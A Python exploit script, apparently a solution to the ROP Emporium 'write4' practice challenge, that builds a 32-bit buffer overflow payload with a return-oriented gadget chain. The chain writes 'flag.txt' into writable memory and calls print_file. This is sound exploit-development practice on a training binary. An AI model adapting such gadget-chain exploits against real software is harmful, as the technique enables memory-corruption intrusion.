#!/usr/bin/python
import sys
import struct

# run < <(python challenge.py)

# At overflow time, edi will be pointing to a read-only area of memory.
# I need to pop an address into edi that is a writeable area of memory with space
# for my payload, and then I can copy stuff from ebp into there
# 0xf7fbf000 0xf7fc0000 0x1000     0x1000     rw-p  /root/tools/write4/libwrite432.so 
# 0x0804a000 0x0804b000 0x1000     0x1000     rw-p  /root/tools/write4/write432 

payload_locations = [
    b'\xa0\xa0\x04\x08',
    b'\xa4\xa0\x04\x08',
    b'\xa8\xa0\x04\x08'
]

# writing payload to the stack worked in gdb,
# size was probably different outside of a debugger
# 0xfffdd000 0xffffe000 0x21000    0x0        rw-p  [stack] 
# 0xfffdd0a0:     0x00000000      0x00000000      0x00000000      0x00000000
"""
payload_locations = [
    b'\xa0\xd0\xfd\xff',
    b'\xa4\xd0\xfd\xff',
    b'\xa8\xd0\xfd\xff'
]
"""

def write_what_where(data, address):
    """
        Four-byte write primitive using the following gadgets:
        0x080485aa : pop edi ; pop ebp ; ret
        0x08048543 : mov dword ptr [edi], ebp ; ret
    """
    if len(data) != 4:
        raise Exception("data length must be 4; this is a 4-byte write primitive")

    pop_edi_pop_ebp_ret   = b'\xaa\x85\x04\x08' # 0x080485aa : pop edi ; pop ebp ; ret
    mov_dword_ptr_edi_ebp = b'\x43\x85\x04\x08' # 0x08048543 : mov dword ptr [edi], ebp ; ret

    # jump to pop/pop/ret gadget; set up registers for mov call; ret to mov call
    payload = pop_edi_pop_ebp_ret + \
            address + \
            data + \
            mov_dword_ptr_edi_ebp

    return payload

print_file = b'\xd0\x83\x04\x08'  # 0x080483d0  print_file@plt
deadcode   = b'\xde\xc0\xad\xde'  # 0xdeadc0de

flag_str   = b'flag'
dot_txt    = b'.txt'
null_bytes = b'\x00lol' # to terminate the string

payload = b'A'*40
payload += b'B'*4                # ebp
payload += write_what_where(flag_str, payload_locations[0])
payload += write_what_where(dot_txt, payload_locations[1])
payload += write_what_where(null_bytes, payload_locations[2])

payload += print_file            # function to execute!
payload += deadcode              # return for print_file
payload += payload_locations[0]  # should be b'flag.txt\x00\x00\x00\x00'

sys.stdout.buffer.write(payload)
